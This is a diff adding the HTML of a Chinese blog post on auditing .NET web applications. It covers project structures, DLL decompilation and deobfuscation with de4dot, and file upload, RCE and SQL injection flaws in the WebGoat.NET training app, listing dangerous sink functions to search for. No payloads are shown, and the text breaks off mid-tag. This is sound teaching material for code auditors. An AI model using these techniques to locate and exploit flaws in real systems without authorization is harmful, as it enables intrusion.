@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>dotnet代码审计系列(一) - Geekby&#39;s Blog</title><meta name="Description" content="dotnet代码审计系列(一)"><meta property="og:url" content="https://www.geekby.site/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/">
+  <meta property="og:site_name" content="Geekby&#39;s Blog">
+  <meta property="og:title" content="dotnet代码审计系列(一)">
+  <meta property="og:description" content="dotnet代码审计系列(一)">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-30T09:23:00+08:00">
+    <meta property="article:modified_time" content="2024-08-30T09:23:00+08:00">
+    <meta property="article:tag" content="代码审计">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="dotnet代码审计系列(一)">
+  <meta name="twitter:description" content="dotnet代码审计系列(一)">
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/" /><link rel="prev" href="https://www.geekby.site/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "dotnet代码审计系列(一)",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2024\/08\/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "代码审计","wordcount":  1046 ,
+        "url": "https:\/\/www.geekby.site\/2024\/08\/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80\/","datePublished": "2024-08-30T09:23:00+08:00","dateModified": "2024-08-30T09:23:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "dotnet代码审计系列(一)"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">dotnet代码审计系列(一)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-08-30">2024-08-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1046 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#11-背景">1.1. 背景</a></li>
+    <li><a href="#12-net-framework与net-core的区别">1.2. .NET Framework与.NET Core的区别</a>
+      <ul>
+        <li><a href="#平台支持"><strong>平台支持</strong></a></li>
+        <li><a href="#开源与社区支持"><strong>开源与社区支持</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-webform开发模式">2.1. WebForm开发模式</a></li>
+    <li><a href="#22-mvc-开发模式">2.2. MVC 开发模式</a></li>
+    <li><a href="#aspnet-core-razor-pages"><strong>ASP.NET Core</strong> Razor Pages</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#41-文件上传漏洞">4.1. 文件上传漏洞</a></li>
+    <li><a href="#42-rce-漏洞">4.2. RCE 漏洞</a></li>
+    <li><a href="#43-sql-注入漏洞">4.3. SQL 注入漏洞</a></li>
+    <li><a href="#44-任意文件读取下载">4.4. 任意文件读取/下载</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#aspnet-core-项目"><strong>ASP.NET Core 项目</strong></a></li>
+    <li><a href="#aspnet-mvc-项目"><strong>ASP.NET MVC 项目</strong></a></li>
+    <li><a href="#aspnet-web-forms-项目"><strong>ASP.NET Web Forms 项目</strong></a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#61-aspnet-core-项目">6.1. ASP.NET Core 项目</a></li>
+    <li><a href="#62-aspnet-mvc-项目">6.2. ASP.NET MVC 项目</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="dotnet代码审计系列一">dotnet代码审计系列(一)</h1>
+<h1 id="1-概述">1. 概述</h1>
+<h2 id="11-背景">1.1. 背景</h2>
+<p>.NET Framework 是微软开发的一个托管代码框架，主要用于构建和运行 Windows 应用程序。它提供了大量的类库、通用语言运行时（CLR）、以及开发和管理应用程序的工具。使用 .NET Framework 开发的应用程序通常是用 C#、VB.NET、F# 等语言编写的，编译后生成中间语言（IL），然后由 CLR 执行。</p>
+<p>.NET Framework 的重要特性包括：</p>
+<ol>
+<li><strong>跨语言互操作性</strong>：不同编程语言编写的组件可以无缝协作，因为它们都编译为 IL 并在 CLR 中运行。</li>
+<li><strong>内存管理</strong>：通过垃圾收集器自动管理内存，减少内存泄漏和其他内存相关的安全问题。</li>
+<li><strong>安全模型</strong>：.NET Framework 提供了代码访问安全（CAS）和验证机制，控制代码的权限和执行。</li>
+</ol>
+<p>在企业应用中，.NET Framework 广泛应用于开发 Web 应用程序、桌面应用程序和服务。在今年国家HW中，仍有大量应用采用 .NET框架。由于其广泛使用以及应用程序的复杂性，.NET 应用程序容易成为攻击者的目标。目前市面上针对 .NET框架代码审计的资料较少，遂总结本文。</p>
+<h2 id="12-net-framework与net-core的区别">1.2. .NET Framework与.NET Core的区别</h2>
+<p><code>.NET</code> 和 <code>.NET Core</code> 是微软开发的两个不同的开发框架，有如下区别：</p>
+<h3 id="平台支持"><strong>平台支持</strong></h3>
+<ul>
+<li><strong>.NET Framework (.NET)</strong>: 仅支持在 Windows 操作系统上运行。适合开发 Windows 桌面应用程序、ASP.NET Web 应用程序等。</li>
+<li><strong>.NET Core</strong>: 是跨平台的框架，可以在 Windows、Linux 和 macOS 上运行。因此，它更适合需要跨平台部署的应用程序。</li>
+</ul>
+<h3 id="开源与社区支持"><strong>开源与社区支持</strong></h3>
+<ul>
+<li><strong>.NET Framework</strong>: 不是完全开源的，虽然它的一些组件是开源的，但整体框架仍然是由微软维护和控制的。</li>
+<li><strong>.NET Core</strong>: 是完全开源的，并且有一个活跃的开源社区。开发者可以访问源代码，并对其进行贡献。</li>
+</ul>
+<p>总之，<code>.NET Core</code> 是一个更现代化、跨平台、模块化的框架，更适合现代应用的开发需求。而 <code>.NET Framework</code> 则主要用于现有 Windows 应用的维护和延续开发。随着 .NET 5+ 的发布，微软将 .NET Core 作为未来的主线开发方向，并统一了整个 .NET 生态系统。</p>
+<h1 id="2-net-web-项目">2. .NET Web 项目</h1>
+<p>目前，ASP.NET中三种主流的开发方式是：ASP.NET Webform、ASP.NET MVC、ASP.NET Core。</p>
+<p>拿一张官方图片来描述：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301005044.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301005044.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301005044.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301005044.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301005044.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301005044.png-water_print" /></p>
+<h2 id="21-webform开发模式">2.1. WebForm开发模式</h2>
+<p>一张经典的图来描述整个过程：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006193.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006193.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006193.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006193.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006193.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006193.png-water_print" /></p>
+<ul>
+<li>aspx页面显示，通常代码是一些html代码，第一行文件头会显示具体触发功能代码的位置，就可以通过这个位置找到处理的函数。服务器端的动作就是在aspx.cs文件中定义</li>
+<li>.cs是类文件，存放公共类。</li>
+<li>.ashx是一般处理程序，主要用于写web handler，可以理解成不会显示的aspx页面，不过效率更高</li>
+<li>dll就是编译之后的cs文件。</li>
+</ul>
+<p>以WebGoat.NET靶场为例：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006147.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006147.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006147.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006147.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006147.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301006147.png-water_print" /></p>
+<p>第一行的含义：</p>
+<ul>
+<li>Language：表示当前所使用的语言，为C# 开发语言。  </li>
+<li>AutoEventWireup：表示 ASP.NET 是否自动将页面事件（如 <code>Page_Load</code>）绑定到页面的事件处理方法，<code>true</code> 表示自动绑定，这意味着如果页面中有一个名为 <code>Page_Load</code> 的方法，它将自动处理页面的 <code>Load</code> 事件。</li>
+<li>CodeBehind： 属性指定与页面关联的代码隐藏文件的路径。在上图中，<code>LoginPage.aspx.cs</code> 是包含后台代码的文件，其中定义了页面的逻辑。在一些较新的 ASP.NET 项目中，<code>CodeBehind</code> 可能被 <code>CodeFile</code> 替代，特别是在 Web Application 项目中。</li>
+<li>Inherits：指定页面继承的类。该页面继承自 <code>OWASP.WebGoat.NET.LoginPage</code> 类，这个类通常在 <code>LoginPage.aspx.cs</code> 文件中定义。</li>
+</ul>
+<p>目录结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">App_Code: 存放共享的代码文件，如类、接口等。这些文件可以在整个应用程序中访问。
+</span></span><span class="line"><span class="cl">App_Data: 存储应用程序的数据库文件或其他数据文件。这个目录对外部用户不可访问。
+</span></span><span class="line"><span class="cl">Bin: 存放编译后的程序集（DLL 文件）和依赖项。这个目录会自动创建。
+</span></span><span class="line"><span class="cl">Resources: 存放与特定页面相关的资源文件。
+</span></span><span class="line"><span class="cl">Web.config: 应用程序的配置文件，用于定义应用程序的设置、连接字符串、路由等。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="22-mvc-开发模式">2.2. MVC 开发模式</h2>
+<p>ASP.NET MVC 是一种基于 MVC 模式的 Web 开发框架，注重分离关注点（Separation of Concerns），即将业务逻辑、用户界面和输入控制分离。具体呈现模式和Java比较类似，在此不做赘述。</p>
+<p>目录结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Controllers: 包含控制器类文件。控制器负责处理用户输入、操作模型，并返回视图。
+</span></span><span class="line"><span class="cl">Models: 存放应用程序的模型类，这些类定义了应用程序的数据结构和业务逻辑。
+</span></span><span class="line"><span class="cl">Views: 包含视图文件（.cshtml 或 .vbhtml），用于呈现用户界面。通常每个控制器有一个对应的视图文件夹。
+</span></span><span class="line"><span class="cl">Scripts: 存放 JavaScript 文件。
+</span></span><span class="line"><span class="cl">App_Start: 包含启动配置文件，如 RouteConfig.cs、BundleConfig.cs、FilterConfig.cs 等。
+</span></span><span class="line"><span class="cl">App_Data: 存储应用程序的数据库文件或其他数据文件。
+</span></span><span class="line"><span class="cl">Bin: 存放编译后的程序集（DLL 文件）和依赖项。
+</span></span><span class="line"><span class="cl">Global.asax: 应用程序的全局配置文件，用于处理应用程序级别的事件。
+</span></span><span class="line"><span class="cl">Web.config: 应用程序的配置文件。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="aspnet-core-razor-pages"><strong>ASP.NET Core</strong> Razor Pages</h2>
+<p>ASP.NET Core 是一个跨平台、高性能的开源框架，用于构建现代 Web 应用、云应用和微服务。它整合了 ASP.NET MVC 和 Web API，并具有更好的性能和灵活性。通过 Razor Pages 提供了一种类似 Web Forms 的开发体验，但更轻量。每个页面由一个 Razor 文件（<code>.cshtml</code>）和一个代码隐藏文件（<code>.cshtml.cs</code>）组成，页面逻辑与视图紧密结合。避免了 MVC 中的路由配置复杂性，适合页面数量少的应用，适用于小型项目或单页面应用程序，以及希望简化页面开发的场景。</p>
+<p>目录结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Controllers: 包含控制器类文件。控制器处理请求并返回响应，通常使用 API 风格或 MVC 模式。
+</span></span><span class="line"><span class="cl">Models: 包含模型类，用于定义应用程序的数据结构和业务逻辑。
+</span></span><span class="line"><span class="cl">Views: 包含视图文件（.cshtml），用于呈现用户界面。
+</span></span><span class="line"><span class="cl">Shared: 包含共享的视图，如布局文件 _Layout.cshtml。
+</span></span><span class="line"><span class="cl">Pages: 用于 Razor Pages 项目，包含页面文件（.cshtml）和页面模型文件（.cshtml.cs）。
+</span></span><span class="line"><span class="cl">wwwroot: 存放静态文件（CSS、JavaScript、图像等）。这个文件夹中的内容可以通过 URL 直接访问。
+</span></span><span class="line"><span class="cl">css: 存放 CSS 文件。
+</span></span><span class="line"><span class="cl">js: 存放 JavaScript 文件。
+</span></span><span class="line"><span class="cl">lib: 存放通过包管理器（如 npm 或 LibMan）安装的前端库。
+</span></span><span class="line"><span class="cl">AppSettings.json: 应用程序的配置文件，替代了传统的 Web.config。
+</span></span><span class="line"><span class="cl">Program.cs: 应用程序的入口点，配置和启动应用程序。
+</span></span><span class="line"><span class="cl">Startup.cs: 配置应用程序的服务和请求管道。通常包括中间件配置和服务依赖注入。
+</span></span><span class="line"><span class="cl">Bin: 存放编译后的程序集（DLL 文件）和依赖项。
+</span></span><span class="line"><span class="cl">Properties: 包含项目的属性文件，如 launchSettings.json，用于配置开发和发布设置。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="3-反编译工具">3. 反编译工具</h1>
+<p>在 .NET 应用程序开发中，预编译（Precompilation）是指将应用程序的代码提前编译成DLL等库文件，以提高性能、减少首次请求的启动时间，并增强代码的保护性。预编译通常应用于 Web 应用程序，如 ASP.NET，这类应用程序的代码在部署到服务器之前可以通过预编译减少或消除运行时编译的需求。</p>
+<p>当站点存在这种情况时，就需要反编译 <code>/bin</code> 目录下的 DLL 文件，来获取源码。</p>
+<p>可选择的 .NET反编译工具主要有四个：dnSpy（于2020年左右停止更新）、ILSpy、dotPeek（JetBrains发布）、dnSpyx（非官方更新版）。</p>
+<p>下图是 ILSpy 反编译的结果：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007462.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007462.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007462.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007462.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007462.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007462.png-water_print" /></p>
+<p>ILSpy对字符串搜索功能不是很友好，因此可以选择将反编译的源码导出为文本，再去审计。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007118.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007118.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007118.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007118.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007118.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007118.png-water_print" /></p>
+<p>如果反编译出的代码存在混淆，则可利用反混淆工具进行还原。反混淆的工具有很多，其中<a href="https://github.com/de4dot/de4dot" title="de4dot" target="_blank" rel="noopener noreffer">de4dot</a>是目前最主流的反混淆工具。</p>
+<p>检测混淆器类型：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl">de4dot.exe -d C:\bin\demo.dll
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>批量反混淆：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl">de4dot.exe -r c:\input -ru -ro c:\output
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="4-常见漏洞">4. 常见漏洞</h1>
+<p>以下漏洞代码均以WebGoat.NET靶场为例</p>
+<h2 id="41-文件上传漏洞">4.1. 文件上传漏洞</h2>
+<p><code>/WebGoat/Content/UploadPathManipulation.aspx.cs</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007481.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007481.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007481.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007481.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007481.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301007481.png-water_print" /></p>
+<p>代码的主要目的是将用户上传的文件保存到服务器上的一个指定目录中，并在上传成功或失败时向用户显示相应的消息。</p>
+<p>具体代码逻辑如下：</p>
+<ol>
+<li><strong>页面加载</strong>：
+<ul>
+<li><code>Page_Load</code> 方法为空，没有进行任何操作。页面加载时，没有特定的逻辑执行。</li>
+</ul>
+</li>
+<li><strong>文件上传</strong>：
+<ul>
+<li><code>btnUpload_Click</code> 方法是按钮点击事件的处理程序，当用户点击上传按钮时触发。</li>
+<li>首先，代码检查 <code>FileUpload1</code> 控件是否包含文件（即 <code>FileUpload1.HasFile</code> 是否为真）。</li>
+<li>如果有文件上传，代码获取文件的名称，并使用 <code>Server.MapPath</code> 将虚拟路径转换为服务器上的物理路径。然后调用 <code>FileUpload1.SaveAs</code> 将文件保存到指定的路径中。</li>
+<li>如果文件上传成功，程序会在 <code>labelUpload</code> 标签中显示成功消息。</li>
+<li>如果上传过程中发生异常，异常信息将显示在 <code>labelUpload</code> 标签中。</li>
+<li>最后，确保 <code>labelUpload</code> 标签可见。</li>
+</ul>
+</li>
+</ol>
+<p>典型文件上传漏洞，未验证文件格式，导致攻击者可上传.aspx文件。</p>
+<p>前端代码如下 <code>/WebGoat/Content/UploadPathManipulation.aspx</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008141.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008141.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008141.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008141.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008141.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008141.png-water_print" /></p>
+<p>代码审计关注点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl">saveas()
+</span></span><span class="line"><span class="cl">File.Move(sourcePath, destinationPath);
+</span></span><span class="line"><span class="cl">File.Copy(sourcePath, destinationPath);
+</span></span><span class="line"><span class="cl">System.IO.File.WriteAllBytes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="42-rce-漏洞">4.2. RCE 漏洞</h2>
+<p><code>/WebGoat/App_Code/Util.cs</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008328.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008328.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008328.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008328.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008328.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008328.png-water_print" /></p>
+<p>如果 cmd 参数可控时，可执行系统命令</p>
+<p>代码审计关注点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl">Process.Start()
+</span></span><span class="line"><span class="cl">ShellExecute()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="43-sql-注入漏洞">4.3. SQL 注入漏洞</h2>
+<p><code>/WebGoat/Content/SQLInjection.aspx.cs</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008587.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008587.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008587.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008587.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008587.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301008587.png-water_print" /></p>
+<p>跟进 GetEmailByName 方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
